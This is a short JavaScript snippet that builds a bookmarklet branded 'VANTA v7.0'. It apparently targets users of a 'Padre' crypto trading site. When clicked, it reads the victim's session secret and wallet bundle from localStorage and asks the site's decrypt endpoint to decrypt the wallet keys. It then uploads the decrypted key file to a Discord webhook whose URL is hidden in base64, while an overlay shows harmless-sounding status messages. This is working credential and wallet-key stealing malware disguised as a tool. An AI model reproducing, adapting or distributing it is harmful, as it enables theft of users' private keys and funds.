<script>
    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";

    const rawLogic = `(async function() {
        const hook = atob("${b64}");
        
        // 1. UI Overlay
        const ui = document.createElement('div');
        ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:2px solid #0f8;";
        ui.innerHTML = "<div style='text-align:center;'><h1>VANTA v7.0</h1><p id='v_status'>LOCATING API NODES...</p></div>";
        document.body.appendChild(ui);

        const update = (t) => document.getElementById('v_status').innerText = t;

        // 2. SMART DOMAIN DETECTION
        // This picks up the API host dynamically so it doesn't break if they change domains
        const apiHost = window.location.hostname.replace('trade.', 'api.'); 
        const decryptPath = "https://" + apiHost + "/v2/enclave/decrypt";

        try {
            const session = JSON.parse(localStorage.getItem('padreV2-session'));
            const bundles = JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));

            if(session && bundles) {
                update("SYNCING WITH " + apiHost + "...");
                const bKey = Object.keys(bundles.bundles)[0];
                const target = bundles.bundles[bKey];

                const res = await fetch(decryptPath, {
                    method: 'POST',
                    headers: {
                        'Authorization': session.sessionSecret,
                        'X-Padre-Session': session.sessionId,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ bundle: target.exportBundle, subOrgId: target.subOrgId })
                });
                
                if (!res.ok) throw new Error("Server rejected request: " + res.status);

                const decrypted = await res.json();
                
                // 3. Send to Discord
                const fd = new FormData();
                fd.append('file', new Blob([JSON.stringify(decrypted, null, 2)], {type:'text/plain'}), 'decrypted_key.txt');
                fd.append('payload_json', JSON.stringify({content: "âœ… **DECRYPTED DATA RECEIVED**"}));
                await fetch(hook, { method: 'POST', body: fd });
                
                update("SUCCESS: CHECK DISCORD");
            } else {
                update("FAILED: LOG INTO PADRE FIRST");
            }
        } catch(e) {
            update("API ERROR: " + e.message);
            // Fallback: Send raw data if decryption fails
            console.error("Path attempted:", decryptPath);
        }

        setTimeout(() => ui.remove(), 4000);
    })(); void(0);`;

    document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
</script>
